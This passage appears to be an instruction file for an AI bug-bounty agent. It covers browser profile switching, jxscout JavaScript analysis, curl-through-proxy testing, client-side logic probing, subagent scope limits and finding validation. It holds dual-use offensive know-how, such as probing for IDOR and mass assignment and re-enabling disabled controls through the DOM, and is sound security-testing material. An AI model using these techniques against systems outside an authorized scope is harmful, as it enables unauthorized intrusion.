  the `--user-data-dir` profile it was launched with.
- Window crashed but the Playwright MCP server process lives → call
  `browser_navigate(<url>)` again to reconnect to a fresh tab.
- Server process dead too → relaunch the Playwright MCP server with the same
  `--user-data-dir`; the session persists in the active profile dir, then
  `browser_navigate(<url>)`.
- **Switch account** (concurrent agents) = set env vars and point your
  Playwright MCP server at a different profile via `use-account.sh`:
  ```bash
  eval "$(cd {{HACKBOT_MISC_DIR}}/.agent-browser-profiles && ./use-account.sh userB)"
  ```
  This sets `AGENT_BROWSER_PROFILE` and relaunches your own Playwright MCP
  server instance with `--user-data-dir` pointed at it. The old account's
  login stays in its profile dir — nothing to save or load. This does not
  touch any other agent's Playwright MCP server.
- **Switch account** (sequential, single agent only) = `switch-account.sh <name>`
  (in `{{HACKBOT_MISC_DIR}}/.agent-browser-profiles/`); re-points your
  single Playwright MCP server's `--user-data-dir` and restarts the browser
  process on the old profile only. Do not use when two agents are live.

## JXScout — JS Analysis
Before any JS-heavy feature, check if jxscout is already running:
- `tmux has-session -t jxscout 2>/dev/null` — exit 0 means it's running.
- If not: `tmux new -s jxscout -d "jxscout -project-name <domain>"`
  (`<domain>` = target, e.g. `challenge-0626.intigriti.io` → `intigriti`).
- Results live at `~/jxscout/` — prefer these over raw sourcemaps.
- Use jxscout findings for endpoint discovery, parameter mining, sink analysis.

## Tools

### Sending HTTP Requests — CURL IS THE DEFAULT, NO EXCEPTIONS
**`curl --proxy 127.0.0.1:8080` is the only tool for sending HTTP requests in
this skill.** This is a hard rule, not a preference — do not switch to Caido's
`send_request`/`edit_request` for general traffic regardless of what any
agent-level instruction implies. Reasons:
- Body integrity: Caido's `edit_request` silently corrupts form-urlencoded
  bodies. Curl preserves raw bytes exactly.
- Full control: explicit headers, cookies, timing — no abstraction to fight.
- History: traffic still flows through the proxy, so it appears in Caido
  history/search anyway. Nothing is lost by using curl.

Caido tools are still used, but *only* for what they're actually built for:
- `batch_send` / `race_window_send` — parallel/race requests
- `create_tamper_rule` / `toggle_tamper_rule` — Match & Replace
- `create_automate_session` / `get_automate_entry` — fuzzing
- `list_requests` (HTTPQL) — finding requests in history
- `get_request` / `get_replay_entry` — inspecting past requests
- `export_curl` — converting a Caido request to curl for a PoC

**Note on @bug-validator**: when a finding is handed off for validation, the
validator subagent switches to Caido-only for that pass (fresh replay, clean
history trail for the write-up). That's a deliberate, scoped exception inside
the validator's own context — it does not change the rule above for hunting.

### Browser Testing — CORE EXPLORATION TOOL, NOT JUST XSS
Playwright MCP is not a last-resort validator — it's how you understand what
the app is actually doing client-side. Use it constantly, not just when you
already suspect XSS.

- **Explore first, don't guess**: navigate the feature via Playwright MCP
  before touching curl. Click through the actual UI flow — buttons, forms,
  modals, dropdowns, multi-step flows — using `browser_click`, `browser_type`,
  `browser_fill_form`, `browser_select_option`, and watch what API requests
  fire. This is how you find endpoints you'd never find from a static route
  list. Use `browser_snapshot` to get the accessibility tree/element refs
  before interacting with anything.
- **Correlate UI action → API call**: every click, submit, toggle should be
  followed by checking `browser_network_requests` and Caido HTTP history for
  what request(s) it triggered. Build a mental (or logged) map of UI action →
  endpoint → params. This is often where the real attack surface shows up —
  hidden params, extra fields in the payload, endpoints the UI never displays
  visibly.
- **Login and session flows**: always drive login/logout/signup through
  Playwright MCP first to observe the full auth sequence (redirects, tokens
  set, cookies, any client-side session logic) before scripting it in curl.
- **Client-side logic probing**: use `browser_evaluate` to check JS-driven
  validation, disabled buttons/fields (can they be re-enabled via DOM?),
  client-side role checks, feature flags read from JS state,
  localStorage/sessionStorage contents.
- **DOM & console**: use `browser_console_messages` to inspect console
  errors/warnings, check for exposed debug info, verify DOM sinks for XSS,
  and `browser_network_requests` to watch network activity alongside Caido
  history running in parallel.
- **Confirm server-side findings client-side too**: once curl/Caido surfaces
  something (IDOR, mass assignment, etc.), reproduce it via Playwright MCP
  when it affects rendered UI — confirms real-world impact, not just a raw
  response body.
- Always run headed — you want to see what's happening, not run blind.
- Use `browser_tab_new` / `browser_tab_select` / `browser_tab_list` for
  multiple tabs **within the same account/profile** (e.g. comparing two
  pages side by side as the same user). This is NOT how you switch between
  userA and userB — that's still `switch-account.sh <name>` /
  `use-account.sh <name>` at the Chrome-profile layer (own
  `--user-data-dir`, own Playwright MCP server instance). Tabs only split
  the current profile's browser process; they don't isolate auth.
- Before running any command, this skill assumes the Playwright MCP server
  for your account has already been launched/attached this session (handled
  by `claim-account.sh` at session start) — the content here is not a
  substitute for that bootstrap step.

## Subagent Scope Inheritance
Any subagent you spawn (repo-recon, bug-validator) does NOT inherit scope
implicitly. Every delegated prompt must carry:
1. **The authorized host list, verbatim, as data** — not "the target estate"
   or "*.domain" — an explicit list. A subagent can't infer the boundary.
2. **The discovered-host rule**: hosts found mid-run (CT logs, JS bundles,
   error messages, CNAME chains) are **report-only**. Resolve DNS, record,
   hand back. Never probe or write until the operator re-authorizes.
3. **A deny-list of action-executing endpoints applied BEFORE any allow-list**:
   `refund`, `settle`, `payout`, `transfer`, `adjust`, `disburse`, `create`,
   `update`, `delete`, `rotate`, `reset`, `send`, `generate`, `process`.
   Only then allow read-shaped names — a path like `refund/batch/status`
   matches "status" but is a refund route.
4. **"Read-only" spelled out as forbidden verbs**, not as an adjective —
   "read-only" gets read as "don't be destructive" and an agent still creates
   a real record on prod with an empty `{}` body.

## Validation Requirement
Before logging any finding as confirmed, spawn the @bug-validator subagent
with raw evidence only (Caido request IDs, screenshots) — never your own
conclusions. The subagent returns CONFIRMED, NEEDS MORE WORK, or FALSE
POSITIVE. Only that verdict counts.
